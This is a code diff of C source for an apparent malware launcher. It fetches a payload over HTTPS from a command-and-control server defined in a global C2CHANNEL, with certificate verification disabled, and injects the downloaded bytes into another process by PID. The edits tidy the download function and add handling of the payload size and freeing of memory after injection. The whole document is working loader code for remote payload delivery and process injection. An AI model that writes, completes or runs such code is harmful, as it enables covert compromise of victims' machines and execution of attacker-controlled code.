@@ -1,4 +1,4 @@
-// cl.exe /MD -DDEBUG launcher.c loader.c /Fo..\..\obj
+// cl.exe /MD -DDEBUG -DWIN_X64 launcher.c loader.c /Fo..\..\obj
 #include "launcher.h"
 
 #define MAX_RECORDS 6
@@ -6,11 +6,6 @@
 #define DNS_PORT 53
 
 C2CHANNEL channel;
-
-struct MemoryStruct {
-    char *memory;
-    size_t size;
-};
 
 // Callback function to write received data to a dynamically growing buffer
 size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
@@ -34,17 +29,15 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
     return realsize;
 }
 
-// Todo: This was slapped together to work. Need to go over
-// cleanup routines
-// error checking
-// mem leaks
+// Perform a get request. Uses the C2CHANNEL global
 void curl_get_file(struct MemoryStruct *buffer)
 {
-   struct MemoryStruct chunk;
+    struct MemoryStruct chunk;
+    char target_server[SERVER_STRING_LENGTH];
 
-    // Stuff that will need to be free'd
     CURL *curl = NULL;
     chunk.memory = calloc(1,1);
+    chunk.size = 0;  // No data yet
 
     // Initialize the "chunk" used to receive data
     if (chunk.memory == NULL)
@@ -52,15 +45,15 @@ void curl_get_file(struct MemoryStruct *buffer)
         dprintf("Memory allocation failed\n");
         return;
     }
-    chunk.size = 0;  // No data yet
     
     curl = curl_easy_init();
     if (curl)
     {
-        char* target_server = calloc(512, 1);
-        if (!target_server)
-            goto cleanup;
-        snprintf(target_server, 511, "https://%s:%d/%ws", channel.c2_server_ip, channel.c2_server_port, (unsigned short*)channel.c2_server_url);
+        if (snprintf(target_server, SERVER_STRING_LENGTH-1, "https://%s:%d/%ws", channel.c2_server_ip, channel.c2_server_port, (unsigned short*)channel.c2_server_url) < 0)
+        {
+            dprintf("Error creating server string.\n");
+            return;
+        }
         dprintf("Performing get request: %s\n", target_server);
         curl_easy_setopt(curl, CURLOPT_URL, target_server);
 
@@ -70,9 +63,6 @@ void curl_get_file(struct MemoryStruct *buffer)
         errbuf[0] = 0;
 
         curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
-
-        // Set headers
-        //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, clientinfo.client_headers);
 
         // Disable SSL certificate verification
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -85,6 +75,7 @@ void curl_get_file(struct MemoryStruct *buffer)
         // Perform the request
         CURLcode res = curl_easy_perform(curl);
 
+        #ifdef DEBUG
         if (res != CURLE_OK)
         {
             size_t len = strlen(errbuf);
@@ -101,7 +92,7 @@ void curl_get_file(struct MemoryStruct *buffer)
                 dprintf("Response code: %ld\n", response_code);
             }
         }
-cleanup:
+        #endif
         // Cleanup
         dprintf("performing curl cleanup.\n");
         curl_easy_cleanup(curl);
@@ -448,9 +439,25 @@ int main(int argc, char **argv)
             data.size = 0;
             // Still have to write this code:
             curl_get_file(&data);
-            int PID = 4; // TODO
-            dprintf("received data size: %zu\n", data.size);
-            inject(PID, data.memory, data.size);
+
+            // If data.size is set, that means we received data
+            if (data.size)
+            {
+                int PID = 12916; // TODO
+                dprintf("received data size: %zu\n", data.size);
+                dprintf("start of data.memory: %s\n", data.memory);
+                // On successful inject, don't keep asking for the payload
+                if (!inject(PID, data.memory, data.size))
+                {
+                    // TODO: Mutex?
+                }
+            }
+            // Free memory. If it was injected, its in another process now
+            if (data.memory)
+            {
+                free(data.memory);
+                data.memory = NULL;
+            }
         }
 
         // Move to the next record
